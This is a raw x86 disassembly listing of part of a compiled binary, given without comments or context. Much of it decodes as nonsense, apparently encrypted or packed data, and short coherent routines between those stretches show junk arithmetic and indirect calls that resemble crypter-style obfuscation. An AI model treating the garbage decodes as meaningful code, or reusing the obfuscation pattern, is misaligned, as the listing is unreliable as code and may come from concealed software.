  404271:	cld    
  404272:	lods   al,BYTE PTR ds:[esi]
  404273:	lods   al,BYTE PTR ds:[esi]
  404274:	jl     0x40420d
  404276:	sbb    ecx,ecx
  404278:	or     al,0x92
  40427a:	nop
  40427b:	jnp    0x4042f2
  40427d:	jp     0x404298
  40427f:	cmp    esi,DWORD PTR [ecx]
  404281:	fisttp DWORD PTR [ebp+esi*8+0x1af02b2e]
  404288:	dec    edx
  404289:	and    ah,BYTE PTR [eax+eiz*4-0x3034a13e]
  404290:	outs   dx,BYTE PTR ds:[esi]
  404291:	fnstenv [ebx]
  404293:	popa   
  404294:	call   0x3d94:0xb8298415
  40429b:	(bad)  
  40429c:	hlt    
  40429d:	das    
  40429e:	and    al,0x89
  4042a0:	and    BYTE PTR [esi-0x1e73ff2],cl
  4042a6:	adc    BYTE PTR [eax+0x705a8159],0x9e
  4042ad:	xchg   edi,eax
  4042ae:	sbb    BYTE PTR [ecx],dh
  4042b0:	and    edi,DWORD PTR [ecx-0x6e]
  4042b3:	sbb    eax,0x809eb4d7
  4042b8:	shl    DWORD PTR [edx+0x5f],cl
  4042bb:	mov    dh,0x4a
  4042bd:	push   0xffffffde
  4042bf:	std    
  4042c0:	cmc    
  4042c1:	loope  0x40433b
  4042c3:	scas   eax,DWORD PTR es:[edi]
  4042c4:	mov    ah,0x45
  4042c6:	(bad)  
  4042c7:	dec    esp
  4042c8:	rcr    BYTE PTR [edi],1
  4042ca:	(bad)  
  4042cb:	add    ecx,ebx
  4042cd:	dec    edi
  4042ce:	sahf   
  4042cf:	rcl    DWORD PTR [edx],1
  4042d1:	mov    esp,DWORD PTR [edx+edx*2+0x7b2c4f4b]
  4042d8:	cmp    ebx,DWORD PTR [ebx]
  4042da:	cmp    DWORD PTR [ebp-0x74],ebp
  4042dd:	adc    al,BYTE PTR ds:0x787b8167
  4042e3:	fs mov eax,0xc968747d
  4042e9:	retf   0x29d6
  4042ec:	loop   0x404283
  4042ee:	pop    ecx
  4042ef:	mov    esp,0xa1760396
  4042f4:	data16 jp 0x40436b
  4042f7:	sbb    DWORD PTR [edx-0x10],0xffffffca
  4042fb:	jbe    0x404289
  4042fd:	xchg   ecx,eax
  4042fe:	scas   al,BYTE PTR es:[edi]
  4042ff:	xchg   esi,eax
  404300:	ret    
  404301:	push   0xc19b7976
  404306:	ret    0xf7db
  404309:	out    dx,al
  40430a:	(bad)  
  40430b:	in     eax,dx
  40430c:	ds pop ebx
  40430e:	adc    eax,0x842d2a0a
  404313:	out    0xee,eax
  404315:	test   eax,0x2d4bb891
  40431a:	retf   
  40431b:	imul   esp,DWORD PTR [eax+0x5d8a0270],0xe2ac7c62
  404325:	div    ebp
  404327:	jle    0x4042a9
  404329:	push   eax
  40432a:	fwait
  40432b:	inc    BYTE PTR [edx+edi*8+0x45b5107b]
  404332:	ins    BYTE PTR es:[edi],dx
  404333:	pop    ds
  404334:	out    0x48,eax
  404336:	mov    cl,0x9e
  404338:	sbb    BYTE PTR [ebx],0x0
  40433b:	mov    al,0x71
  40433d:	fidiv  DWORD PTR [edi]
  40433f:	out    0x85,al
  404341:	cld    
  404342:	jmp    0xad596b38
  404347:	sub    eax,0x2e8239b9
  40434c:	sbb    DWORD PTR [eax+eax*1],eax
  40434f:	sti    
  404350:	jae    0x4043b2
  404352:	push   ss
  404353:	or     eax,0x1be2853
  404358:	out    dx,eax
  404359:	loope  0x4043b8
  40435b:	fist   DWORD PTR [edx]
  40435d:	lock cmp dh,BYTE PTR [edx+0x1]
  404361:	jo     0x4042ed
  404363:	pop    edx
  404364:	jmp    0x4042f7
  404366:	xor    cl,BYTE PTR [esi]
  404368:	ins    BYTE PTR es:[edi],dx
  404369:	jns    0x404359
  40436b:	jg     0x4043d7
  40436d:	ja     0x404334
  40436f:	das    
  404370:	pop    es
  404371:	mov    ch,0xc7
  404373:	int3   
  404374:	(bad)  
  404375:	daa    
  404376:	jne    0x4043dd
  404378:	xor    eax,DWORD PTR [esi]
  40437a:	cwde   
  40437b:	dec    ecx
  40437c:	outs   dx,BYTE PTR ds:[esi]
  40437d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40437e:	push   cs
  40437f:	test   DWORD PTR [ebp-0x69e251d3],eax
  404385:	imul   ebp,DWORD PTR [ebp+0x1e],0xffffffc7
  404389:	inc    ebp
  40438a:	cld    
  40438b:	xor    al,BYTE PTR [ebp+0x458bf89c]
  404391:	cld    
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	data16 gs data16 mov ah,0xfd
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x404474
  404439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40443a:	xchg   esp,esi
  40443c:	push   eax
  40443d:	and    BYTE PTR ds:0x2d3a3d36,dl
  404443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404444:	shl    BYTE PTR [edi+eax*2-0x6f42eccf],0xaa
  40444c:	dec    esi
  40444d:	cmp    eax,ebx
  40444f:	mov    dl,0x50
  404451:	xlat   BYTE PTR ds:[ebx]
  404452:	scas   eax,DWORD PTR es:[edi]
  404453:	leave  
  404454:	xchg   edx,eax
  404455:	jle    0x40445d
  404457:	test   BYTE PTR [esp+esi*2+0x794dcf6f],bl
  40445e:	scas   eax,DWORD PTR es:[edi]
  40445f:	cmp    eax,0xff471dcf
  404464:	and    DWORD PTR [eax+0x2c],eax
  404467:	xchg   ebp,eax
  404468:	and    eax,DWORD PTR [ecx-0x12ef2437]
  40446e:	ret    0xe02
  404471:	stos   DWORD PTR es:[edi],eax
  404472:	add    BYTE PTR [esi+0x3f],ch
  404475:	cli    
  404476:	std    
  404477:	push   ebx
  404478:	or     ebp,esp
  40447a:	aaa    
  40447b:	repnz in eax,0xe1
  40447e:	nop
  40447f:	lds    ebx,FWORD PTR [edx+0x329cb764]
  404485:	inc    esp
  404486:	dec    eax
  404487:	lahf   
  404488:	push   ds
  404489:	fnstsw WORD PTR [edx]
  40448b:	int    0x8
  40448d:	test   BYTE PTR [edx],0x18
  404490:	inc    ebp
  404491:	popa   
  404492:	jmp    0x404456
  404494:	mov    esi,0x91ea6391
  404499:	jge    0x404467
  40449b:	lds    edi,FWORD PTR [esi-0x56ce3411]
  4044a1:	push   edx
  4044a2:	es jle 0x40450c
  4044a5:	pop    ebx
  4044a6:	add    BYTE PTR [eax],cl
  4044a8:	mov    al,ds:0xd49c4407
  4044ad:	mov    al,0x51
  4044af:	or     BYTE PTR [edi-0x5],dl
  4044b2:	ins    BYTE PTR es:[edi],dx
  4044b3:	xor    esi,esi
  4044b5:	jo     0x4044b1
  4044b7:	cmp    edx,DWORD PTR [eax+0x57]
  4044ba:	sub    cl,BYTE PTR [edi+0x67]
  4044bd:	xor    esp,eax
  4044bf:	mov    edx,0x4ce10d36
  4044c4:	cmp    BYTE PTR [edx+esi*8+0x24],dl
  4044c8:	in     al,0xd5
  4044ca:	or     al,0x1b
  4044cc:	add    eax,0x436b686
  4044d1:	sub    eax,0xaff0c456
  4044d6:	adc    DWORD PTR [edi+0x5f],ebp
  4044d9:	fimul  WORD PTR [edx]
  4044db:	cmp    ebp,ebp
  4044dd:	pop    ecx
  4044de:	fimul  WORD PTR [eax]
  4044e0:	push   ss
  4044e1:	mov    bh,0xee
  4044e3:	fwait
  4044e4:	add    dl,BYTE PTR [edx+0x717854a5]
  4044ea:	loopne 0x40455f
  4044ec:	repnz inc edi
  4044ee:	jne    0x4044ec
  4044f0:	nop
  4044f1:	mov    ah,0x99
  4044f3:	xchg   edi,eax
  4044f4:	iret   
  4044f5:	daa    
  4044f6:	xor    al,0xd2
  4044f8:	stos   DWORD PTR es:[edi],eax
  4044f9:	push   ecx
  4044fa:	jg     0x4044a7
  4044fc:	jno    0x40450e
  4044fe:	jmp    0xff885614
  404503:	lds    ebp,FWORD PTR [ebx]
  404505:	test   eax,0x41a3da9
  40450a:	shl    DWORD PTR [eax+esi*8-0x65],0x41
  40450f:	sbb    BYTE PTR ds:0xb8efd429,bh
  404515:	inc    ecx
  404516:	mov    bh,0x14
  404518:	ins    DWORD PTR es:[edi],dx
  404519:	std    
  40451a:	xlat   BYTE PTR ds:[ebx]
  40451b:	and    al,0x25
  40451d:	xchg   esp,eax
  40451e:	dec    ecx
  40451f:	fmul   DWORD PTR [esi-0x18]
  404522:	div    DWORD PTR [edi+0x3d3c0c84]
  404528:	cmp    DWORD PTR [ecx-0x3b],ebp
  40452b:	fisub  DWORD PTR [ebx-0x60bf1dcc]
  404531:	cmp    DWORD PTR [ebx-0x2eabf7ec],esi
  404537:	andnps xmm7,XMMWORD PTR [ecx-0x11]
  40453b:	jnp    0x404593
  40453d:	pop    ebx
  40453e:	ds fdivr st,st(1)
  404541:	fistp  WORD PTR [ebx]
  404543:	jnp    0x4044d2
  404545:	sbb    eax,0x787ef778
  40454a:	sbb    esp,ecx
  40454c:	inc    ebx
  40454d:	and    esp,ebx
  40454f:	dec    edx
  404550:	sub    cl,al
  404552:	mov    dl,0x2
  404554:	das    
  404555:	adc    al,0x60
  404557:	dec    edi
  404558:	xchg   ecx,eax
  404559:	adc    DWORD PTR [ebx+0x737f3e56],ebx
  40455f:	hlt    
  404560:	(bad)  
  404562:	ret    
  404563:	mov    ?,WORD PTR [eax+0x33930c31]
  404569:	jo     0x40450c
  40456b:	shl    BYTE PTR [esi+0x7df2aa28],0xf0
  404572:	push   0xb36f1815
  404577:	popf   
  404578:	jle    0x4045e6
  40457a:	in     al,0x71
  40457c:	in     eax,0xcf
  40457e:	mov    ebx,0x5f45782c
  404583:	sbb    DWORD PTR [edi+0x6f],0x1ca075cf
  40458a:	pushf  
  40458b:	retf   
  40458c:	pop    ds
  40458d:	cli    
  40458e:	or     al,0x0
  404590:	out    0x15,eax
  404592:	out    0x53,al
  404594:	cmp    al,0xae
  404596:	(bad)  
  404597:	or     BYTE PTR [esi+ebp*8-0x25],al
  40459b:	inc    ebx
  40459c:	mov    bh,BYTE PTR [edx-0x70]
  40459f:	call   0x9060:0x5b624394
  4045a6:	cwde   
  4045a7:	inc    esi
  4045a8:	jo     0x4045c2
  4045aa:	dec    ecx
  4045ab:	and    bh,BYTE PTR [edx-0x7e]
  4045ae:	je     0x4045b1
  4045b0:	dec    edi
  4045b1:	or     eax,0xe3816a6b
  4045b6:	aaa    
  4045b7:	aaa    
  4045b8:	leave  
  4045b9:	or     BYTE PTR [ebp-0x71],ah
  4045bc:	pxor   mm4,mm6
  4045bf:	out    0x24,al
  4045c1:	pop    es
  4045c2:	pop    ebx
  4045c3:	js     0x4045e7
  4045c5:	xchg   ebp,eax
  4045c6:	jmp    0x4045ab
  4045c8:	clc    
  4045c9:	aad    0x79
  4045cb:	jns    0x4045f3
  4045cd:	push   esi
  4045ce:	mov    al,ds:0x7ef2b4db
  4045d3:	mov    edx,?
  4045d5:	push   0xffffffd0
  4045d7:	fcomp  DWORD PTR [eax+ecx*4+0x559d9c2c]
  4045de:	hlt    
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404767
  4046fa:	es test edi,ecx
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046c0
  404706:	outs   dx,DWORD PTR ds:[esi]
  404707:	push   eax
  404708:	mov    ebp,0xf8b6e483
  40470d:	in     eax,dx
  40470e:	lods   al,BYTE PTR ds:[esi]
  40470f:	jne    0x4046ca
  404711:	mov    edi,0xfd971d43
  404716:	push   ds
  404717:	push   ecx
  404718:	sub    esp,edi
  40471a:	cld    
  40471b:	xor    eax,0xbcc210cf
  404720:	ja     0x404765
  404722:	xchg   ebx,eax
  404723:	jmp    0x4046e0
  404725:	dec    ebx
  404726:	ins    BYTE PTR es:[edi],dx
  404727:	push   ecx
  404728:	dec    esi
  404729:	dec    edi
  40472a:	add    ch,BYTE PTR [esi]
  40472c:	lahf   
  40472d:	dec    esi
  40472e:	add    esp,DWORD PTR [edx+0x6e198736]
  404734:	mov    eax,ds:0xeabf51aa
  404739:	rcl    BYTE PTR ds:0xde3d2108,0x2c
  404740:	xchg   DWORD PTR [esi-0x403846b8],esp
  404746:	cmp    ecx,DWORD PTR [eax]
  404748:	lahf   
  404749:	clc    
  40474a:	lods   eax,DWORD PTR ds:[esi]
  40474b:	popf   
  40474c:	jno    0x40474e
  40474e:	sub    ebx,0xa8dc7f62
  404754:	jmp    0x4046fe
  404756:	push   ecx
  404757:	pop    ebp
  404758:	js     0x4047b9
  40475a:	in     al,dx
  40475b:	cmp    al,0x66
  40475d:	push   ebx
  40475f:	cmp    ecx,edx
  404761:	xor    ah,bl
  404763:	mov    ebp,0x3d5bfa38
  404768:	inc    eax
  404769:	sbb    BYTE PTR [ebx-0x38228c41],al
  40476f:	icebp  
  404770:	or     eax,0xacd74180
  404775:	lods   al,BYTE PTR ds:[esi]
  404776:	stos   BYTE PTR es:[edi],al
  404777:	jmp    0x404710
  404779:	inc    ebx
  40477a:	mov    ebp,0x3e417fb6
  40477f:	mov    ah,0x25
  404781:	xchg   esi,eax
  404782:	mov    bl,dl
  404784:	add    eax,DWORD PTR [eax]
  404786:	push   ecx
  404787:	pop    ebx
  404788:	cmp    eax,0xc78fd4da
  40478d:	sub    DWORD PTR [ecx+0x462b32e8],edx
  404793:	dec    edx
  404794:	rcl    BYTE PTR [edi+eax*2+0x69270695],1
  40479b:	sub    al,0x88
  40479d:	mov    edi,0x26188030
  4047a2:	popa   
  4047a3:	aad    0xe
  4047a5:	mov    edi,0x1273d5e7
  4047aa:	ror    edx,cl
  4047ac:	bound  esi,QWORD PTR [ebp+0x195e1563]
  4047b2:	jle    0x404803
  4047b4:	ja     0x404829
  4047b6:	dec    ecx
  4047b7:	test   al,0xfc
  4047b9:	rol    BYTE PTR [ecx+0x591b59d8],1
  4047bf:	jge    0x4047ca
  4047c1:	inc    esi
  4047c2:	sub    BYTE PTR [ebx-0x2d],bh
  4047c5:	mov    ebp,0x8371ce97
  4047ca:	shl    DWORD PTR [ecx+0x11],cl
  4047cd:	sbb    cl,BYTE PTR [edi+0x26]
  4047d0:	and    cl,bh
  4047d2:	jecxz  0x40483b
  4047d4:	cmp    eax,0xeb7b0639
  4047d9:	mov    al,ds:0x8080a19b
  4047de:	cmp    DWORD PTR [edi],ecx
  4047e0:	jg     0x4047dd
  4047e2:	push   esi
  4047e3:	push   es
  4047e4:	fdiv   DWORD PTR [esi-0x2b]
  4047e7:	dec    ebx
  4047e8:	dec    edx
  4047e9:	maskmovq mm4,(bad)
  4047ea:	mul    DWORD PTR [ebp+0x7770c90d]
  4047f0:	mov    al,ds:0x487ba895
  4047f5:	fidiv  WORD PTR [esi+eiz*2-0x1f]
  4047f9:	add    DWORD PTR [ebp+0x520508fe],esi
  4047ff:	pusha  
  404800:	lods   al,BYTE PTR ds:[esi]
  404801:	and    BYTE PTR [ecx+0x14560b4f],al
  404807:	fimul  WORD PTR [ecx+edi*2]
  40480a:	loope  0x404798
  40480c:	inc    edx
  40480d:	adc    eax,0xa638d05d
  404812:	cld    
  404813:	jge    0x404841
  404815:	sti    
  404816:	imul   esp,DWORD PTR ds:0x2f128efe,0xffffff92
  40481d:	out    0x2e,eax
  40481f:	mov    eax,ds:0xa2489ac2
  404824:	lahf   
  404825:	out    0x33,eax
  404827:	test   eax,0x70ac199a
  40482c:	or     cl,dh
  40482e:	jno    0x404826
  404830:	xchg   ebp,eax
  404831:	jmp    0x8735:0x51cf8c59
  404838:	mov    DWORD PTR [eax+0x35590e30],edi
  40483e:	mov    es,WORD PTR [edx]
  404840:	and    eax,ebp
  404842:	inc    eax
  404843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404844:	fisubr DWORD PTR [esi-0x38]
  404847:	mov    cl,0x2b
  404849:	call   0xc74f:0xa058532c
  404850:	sbb    DWORD PTR [ebx+edx*2],0x47
  404854:	add    al,0xc
  404856:	cmp    al,0x15
  404858:	adc    eax,0xb981197
  40485d:	and    al,0xdd
  40485f:	sbb    esp,ebp
  404861:	inc    esi
  404862:	jl     0x404844
  404864:	ds and al,0x6
  404867:	and    eax,0xfbfab778
  40486c:	cmp    eax,edi
  40486e:	add    al,0x84
  404870:	xchg   esp,eax
  404871:	sub    DWORD PTR [esi+0x4f61ec3e],esp
  404877:	mov    esp,eax
  404879:	or     DWORD PTR es:[eax-0x5c],0xf2c67100
  404881:	xchg   BYTE PTR [edi+0x72],bl
  404884:	in     eax,dx
  404885:	test   DWORD PTR [ebx-0x13],0x43ecc51c
  40488c:	jl     0x404854
  40488e:	out    dx,al
  40488f:	push   cs
  404890:	pop    ss
  404891:	sbb    BYTE PTR [edx+0x70],ah
  404894:	jo     0x404910
  404896:	xor    ebx,DWORD PTR [eax]
  404898:	mov    ecx,0x910ad63e
  40489d:	xor    edx,ecx
  40489f:	enter  0x4d88,0x38
  4048a3:	cmp    esi,DWORD PTR [eax]
  4048a5:	or     al,0x0
  4048a7:	sub    al,0x1b
  4048a9:	inc    esp
  4048aa:	adc    DWORD PTR [ebp-0x3e],ecx
  4048ad:	popf   
  4048ae:	jle    0x4048be
  4048b0:	clc    
  4048b1:	push   cs
  4048b2:	in     eax,dx
  4048b3:	add    BYTE PTR [edi],cl
  4048b5:	cli    
  4048b6:	int3   
  4048b7:	xor    esi,DWORD PTR [ebp+0x35be088b]
  4048bd:	jo     0x40488d
  4048bf:	outs   dx,DWORD PTR ds:[esi]
  4048c0:	jmp    0xdbd4:0x73da2183
  4048c7:	mov    ds:0xdb91fccc,eax
  4048cc:	aad    0x4f
  4048ce:	sub    eax,0x7742bbd7
  4048d3:	add    ah,BYTE PTR [esi+0x58cd9d58]
  4048d9:	stos   DWORD PTR es:[edi],eax
  4048da:	sbb    edx,DWORD PTR [edi+0x3f6d7d2c]
  4048e0:	dec    edi
  4048e1:	sti    
  4048e2:	inc    edx
  4048e3:	es cmp bl,ch
  4048e6:	test   al,0xa6
  4048e8:	cmp    BYTE PTR [eax-0x5397df97],dl
  4048ee:	xor    ebp,DWORD PTR [edx-0x5b]
  4048f1:	dec    ecx
  4048f2:	mov    WORD PTR [esi+0x39],?
  4048f5:	or     bh,BYTE PTR [ebx+0x4a]
  4048f8:	retf   0x44e8
  4048fb:	mov    edx,esi
  4048fd:	popa   
  4048fe:	push   ebx
  4048ff:	repnz push ebp
  404901:	pinsrw mm6,WORD PTR [ecx],0x34
  404905:	jns    0x4048ed
  404907:	lea    ebp,[ecx]
  404909:	fist   DWORD PTR [ebp-0xbff8b60]
  40490f:	sub    bl,BYTE PTR [edx+0x4]
  404912:	lods   eax,DWORD PTR ds:[esi]
  404913:	mov    ah,BYTE PTR [esi]
  404915:	inc    eax
  404916:	push   eax
  404917:	pop    eax
  404918:	cmc    
  404919:	dec    edi
  40491a:	mov    eax,0xbc014fdf
  40491f:	inc    edx
  404920:	neg    BYTE PTR [edi+0x6642535d]
  404926:	inc    edx
  404927:	xchg   ebp,eax
  404928:	dec    ebx
  404929:	adc    ch,ah
  40492b:	jl     0x40497d
  40492d:	xchg   BYTE PTR [ecx+0x21],bl
  404930:	inc    ecx
  404931:	adc    DWORD PTR [edx+0xe],0x7
  404935:	lds    edx,FWORD PTR [edi+0x283a2a1c]
  40493b:	cmc    
  40493c:	mov    esi,0xb11c51c0
  404941:	cmp    eax,0x6c6ee7ed
  404946:	jo     0x40490c
  404948:	push   ebp
  404949:	les    ebp,FWORD PTR [esi+ebx*2-0x6c4f1242]
  404950:	lods   eax,DWORD PTR ds:[esi]
  404951:	add    DWORD PTR [eax],0xffffffa9
  404954:	dec    ecx
  404955:	cmc    
  404956:	push   ss
  404957:	lods   al,BYTE PTR ds:[esi]
  404958:	addr16 push ebx
  40495a:	adc    dh,BYTE PTR [edi]
  40495c:	iret   
  40495d:	nop
  40495e:	icebp  
  40495f:	repz fnclex 
  404962:	fdivp  st(1),st
  404964:	pop    edx
  404965:	retf   
  404966:	push   esp
  404967:	push   edi
  404968:	push   edi
  404969:	sbb    ecx,DWORD PTR [eax+ecx*1]
  40496c:	(bad)  
  40496e:	add    DWORD PTR [esi-0x66],esp
  404971:	scas   al,BYTE PTR es:[edi]
  404972:	lahf   
  404973:	adc    al,0x91
  404975:	ret    
  404976:	mov    ds,WORD PTR [edx]
  404978:	std    
  404979:	and    al,0xf7
  40497b:	mov    ch,0x17
  40497d:	push   ds
  40497e:	pop    ebp
  40497f:	xlat   BYTE PTR ds:[ebx]
  404980:	rcr    DWORD PTR [ebp+0x77],cl
  404983:	jl     0x404913
  404985:	clc    
  404986:	adc    dl,BYTE PTR [ebp-0x47]
  404989:	jmp    0x404939
  40498b:	sub    eax,0xf93d7536
  404990:	imul   ecx,DWORD PTR [esp+edi*4+0x49bf6d87],0xffffffc3
  404998:	jl     0x404961
  40499a:	fisubr WORD PTR [edx]
  40499c:	mov    bh,0xcf
  40499e:	test   BYTE PTR [edi],dl
  4049a0:	add    al,0x7e
  4049a2:	cmp    eax,0x8102892c
  4049a7:	and    eax,0x42e658
  4049ac:	add    BYTE PTR [eax],al
  4049ae:	add    BYTE PTR [eax],al
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	aad    0xf1
  404a8d:	fdivrp st(3),st
  404a8f:	inc    edi
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	test   eax,0x3a2c1adf
  404a9c:	pop    ss
  404a9d:	push   esp
  404a9e:	scas   eax,DWORD PTR es:[edi]
  404a9f:	call   0x5c0c:0x3218cf9b
  404aa6:	cli    
  404aa7:	xchg   BYTE PTR [edx+0x59],al
  404aaa:	aad    0x39
  404aac:	and    DWORD PTR [ecx+0x2b6af970],esp
  404ab2:	out    0x34,eax
  404ab4:	arpl   WORD PTR [ebx-0x6f3c97d3],bx
  404aba:	inc    esp
  404abb:	add    eax,0xf0e5f390
  404ac0:	mov    esp,0x33e8aeb1
  404ac5:	jb     0x404b30
  404ac7:	xchg   esi,eax
  404ac8:	xor    DWORD PTR [edx-0x42],ecx
  404acb:	sub    al,0xcc
  404acd:	rcr    DWORD PTR [eax-0x779aa81],0x54
  404ad4:	dec    edi
  404ad5:	mov    eax,0x79eac60c
  404ada:	mov    cl,0x24
  404adc:	pop    ds
  404add:	dec    esp
  404ade:	and    BYTE PTR [esi],0xdf
  404ae1:	push   ecx
  404ae2:	adc    al,BYTE PTR [edi]
  404ae4:	mov    BYTE PTR [ecx+0x35561d12],0x6c
  404aeb:	leave  
  404aec:	or     cl,BYTE PTR [esi+ebx*1-0x57]
  404af0:	and    BYTE PTR [esi-0x4a91472c],cl
  404af6:	test   BYTE PTR ds:0x4f06e738,ah
  404afc:	mov    ecx,0x948d4dc4
  404b01:	fdivr  DWORD PTR [edx+0x52bf4192]
  404b07:	in     al,dx
  404b08:	xchg   esp,eax
